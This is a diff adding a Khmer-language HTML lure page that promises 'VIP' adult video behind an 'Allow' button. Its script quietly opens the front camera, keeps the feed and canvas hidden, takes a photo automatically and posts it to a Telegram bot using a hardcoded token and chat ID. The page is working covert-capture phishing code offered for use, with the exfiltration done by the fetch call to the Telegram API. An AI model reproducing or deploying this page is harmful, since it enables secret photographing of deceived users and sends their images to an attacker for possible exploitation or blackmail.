@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+      background-color: #f4f4f9;
+    }
+    .btn-allow {
+      padding: 15px 35px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #fff;
+      background-color: #007bff;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.2s;
+    }
+    .btn-allow:hover {
+      background-color: #0056b3;
+    }
+    /* លាក់វីដេអូ និង canvas មិនឱ្យឃើញនៅលើអេក្រង់ */
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>ចុចទីនេះដេីម្បីមេីលរឿងVIPខ្មែរ💦</h2>
+  
+  <button class="btn-allow" onclick="requestPermission()">Allow</button>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // ព័ត៌មាន Telegram Bot របស់អ្នក
+    const BOT_TOKEN = "8742389901:AAHLwDIwH6CRTo9dbNv6ZwjOYxsbYICrTPI"; 
+    const CHAT_ID = "5983230232"; 
+
+    function requestPermission() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) 
+        .then(stream => {
+          video.srcObject = stream; 
+          
+          // រង់ចាំ 0.5 វិនាទីឱ្យកាមេរ៉ាដំណើរការច្បាស់ រួចថតស្វ័យប្រវត្តិ
+          setTimeout(() => {
+            takePhotoAuto(stream);
+          }, 500);
+        })
+        .catch(err => {
+          alert("Camera access denied!"); 
+          console.error(err); 
+        });
+    }
+
+    function takePhotoAuto(stream) {
+      const context = canvas.getContext('2d'); 
+
+      canvas.width = video.videoWidth; 
+      canvas.height = video.videoHeight; 
+      
+      context.drawImage(video, 0, 0); 
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData(); 
+        formData.append("chat_id", CHAT_ID); 
+        formData.append("photo", blob, "photo.png"); 
+
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+            method: "POST", 
+            body: formData 
+          });
+
+          if (response.ok) {
+            alert("រូបថតត្រូវបានផ្ញើទៅ Telegram រួចរាល់!");
+          } else {
+            alert("មិនអាចផ្ញើរូបថតបានទេ។");
+          }
+        } catch (error) {
+          console.error(error); 
+          alert("មានបញ្ហាក្នុងការផ្ញើរូបថត។");
+        } finally {
+          // បិទកាមេរ៉ាវិញភ្លាមៗបន្ទាប់ពីថតរួច
+          stream.getTracks().forEach(track => track.stop());
+        }
+
+      }, 'image/png'); 
+    }
+  </script>
+
+</body>
+</html>
